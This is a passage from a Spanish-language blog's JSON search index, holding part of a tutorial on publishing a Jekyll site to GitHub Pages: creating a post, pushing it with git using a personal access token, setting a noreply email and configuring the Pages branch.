de nombre YYYY-MM-DD-un-nombre.md, por ejemplo:2022-08-01-hola-mundo.mdEn el fichero copiamos el siguiente código:---title: Hola mundo_date: 2022-08-01 14:10:00 +0800categories: [Tutos]tags: [\"hola mundo\"] # TAG names should always be lowercase---Mi primer post en GH ;)Guardamos y volvemos al navegador donde tenemos abierto nuestro sitio. Refrescamos y debería aparecernos nuestra nueva entrada. De no ver los cambios, id al terminal, cerrar la sesion del server con Ctrl + c, volved a ejecutar $ bundle exec jekyll s  y recargar el site desde la ventana del navegador. Si, es cierto, a veces el tema del regenerado automático se queda tieso :(Subir todo a Github.La mecánica aquí es la habitual para subir cosas a Github por lo que iré algo rápido, centrándome solo en un detalle particular que debemos considerar relacionado con Github Pages.Tened en cuenta que para ejecutar el push  que veremos en breve el sistema nos va a solicitar nuestra Personal Access Token de Github. Si no disponéis de ella, aqui tenéis la documentación oficial de Github para crearla.Desde nuestro terminal, posicionados en nuestro directorio raíz, ejecutamos:┌──(ewan㉿kali)-[~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io]└─$ git initReinitialized existing Git repository in /home/ewan/ewan67/ewan67.github.io/.git/┌──(ewan㉿kali)-[~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io]└─$ git add .┌──(ewan㉿kali)-[~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io]└─$ git commit -m \"primer commit\" [main 2cdb01b] primer commit... nos lista los ficheros que se van a publicar ...┌──(ewan㉿kali)-[~/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io]└─$ git pushUsername for 'https://github.com': &lt;mi_usuarioGH&gt;Password for 'https://Ewan67@github.com': &lt;nuestro Personal Access Token&gt;... inicia el proceso ... Nota: Si tenéis vuestra dirección de mail en GH configurada como privada, puede que os salga un mensaje al intentar publicar advirtiendo sobre la posibilidad de que ésta sea visible. La solución a este aviso es utilizar una dirección de correo que Github denomina noreplay.  personalizada y única para cada usuario. Aqui podéis ver cómo funciona el tema y dónde obtener vuestra dirección xxxxxxxxx+&lt;mi_usuarioGH&gt;@users.noreply.github.com personal. Una vez os hagáis con ella podéis configurarla en local ejecutando el comando:$ git config --global user.email \"xxxxxxxxx+&lt;mi_usuarioGH&gt;@users.noreply.github.com\" Ahora nos vamos a nuestra pestaña del navegador donde tenemos abierta la web de Github, accedemos a nuestro repositorio &lt;mi_usuarioGH&gt;.github.io  y pinchamos en Commit para ver el progreso de nuestro envío.Una vez finalizado (según el número de cambios, el estado de la red, etc; el proceso puede tardar unos minutos, sed pacientes) veremos que se nos ha creado una nueva rama (branch) en nuestro repo llamada gh-pages. Toca hacer la última configuración que mencionaba mas arriba para dejar todo ok.Desde la home de nuestro repo cuya URL será algo como …https://github.com/&lt;mi_usuarioGH&gt;/&lt;mi_usuarioGH&gt;.github.io) Damos a la opción Settings del menú horizontal. Damos a la opción Pages del menú lateral izquierdo. En el apartado Build and deployment  &gt;  Branch configuramos lo siguiente: Le damos al boton Save. Y listo !!! … Ya podemos crear y modificar el contenido de nuestro site en local y publicar los cambios a nuestro repo de Github Pages.Hay varias posibilidades mas que no he mencionado en esta guía en aras de la brevedad. Los mas curiosos podéis brujulear por la red donde encontraréis contenidos muy interesantes sobre las posibilidades de Jekyll y GH.Aún así espero que os haya valido este tuto al menos como introducción. Cualquier duda o comentario podéis escribirme a mi correo, intentaré responderos ASAP.Sed buenos si no hay una opción mejor." }, { "title": "Hola mundo_", "url": "/posts/hola-mundo/", "categories": "Tutos", "tags": "hola mundo", "date": "2022-08-01 07:10:00 +0100", "snippet": "Mi primer post en Github Pages ;)" } ]
